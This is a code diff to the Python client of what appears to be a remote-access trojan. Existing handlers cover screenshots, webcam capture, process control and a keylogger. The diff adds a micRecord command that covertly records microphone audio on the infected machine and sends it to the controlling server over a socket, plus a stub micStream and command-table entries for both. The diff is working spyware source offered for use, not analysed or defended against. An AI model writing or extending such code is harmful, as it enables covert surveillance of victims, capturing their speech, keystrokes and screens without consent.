@@ -7,6 +7,7 @@ __version__ = '2.0'
 from socket import socket, AF_INET, SOCK_STREAM
 from getpass import getuser
 from datetime import datetime
+from typing import ByteString
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
 from psutil import process_iter, AccessDenied
@@ -14,6 +15,9 @@ from pynput.keyboard import Listener, KeyCode
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
+from sounddevice import OutputStream, rec, wait
+from numpy import record, save
+from io import BytesIO
 from subprocess import getoutput
 from requests import get
 from os import uname, chdir, getcwd
@@ -147,6 +151,34 @@ class Client(object):
         else:
             self.sendHeader({"content": "[red] Error: The Klogger is not running."})
 
+    def micStream(self, args):
+        pass
+
+    # recording microphone audio
+    def micRecord(self, args):
+        if args:
+            if args[0].isdigit():
+                recorded = rec(channels=2, frames=(44100*int(args[0])), samplerate=44100);wait()
+                audio = BytesIO()
+                save(audio, recorded, allow_pickle=True)
+            else:
+                self.sendHeader({'sucess': False, 'content': '[red] Please pass seconds as [yellow]integer.'})
+                return
+        else:
+            recorded = rec(channels=2, frames=(44100*5), samplerate=44100);wait()
+            audio = BytesIO()
+            save(audio, recorded, allow_pickle=True)
+
+        self.sendHeader({
+            "namefile": f"micRecord-{datetime.now().strftime('%d.%m.%y-%H.%M.%S')}",
+            "extension": '.wav',
+            "bytes": len(audio.getvalue()),
+            "path": "files",
+            "sucess": True
+        })
+        sleep(0.5)
+        self.__Client.send(audio.getvalue())
+
     # receiving a file from server side (upload)
     def upload(self, args):
         header = loads(self.__Client.recv(512))
@@ -277,6 +309,8 @@ class Client(object):
             "/processlist": {"action": self.getProcessList},
             "/processinfo": {"action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
+            "/micrecord": {"action": self.micRecord},
+            "/micstream": {"action": self.micStream},
             "/kloggerstart": {"action": self.keyloggerStart},
             "/kloggerdump": {"action": self.keyloggerDump},
             "/kloggerstop": {"action": self.keyloggerStop},
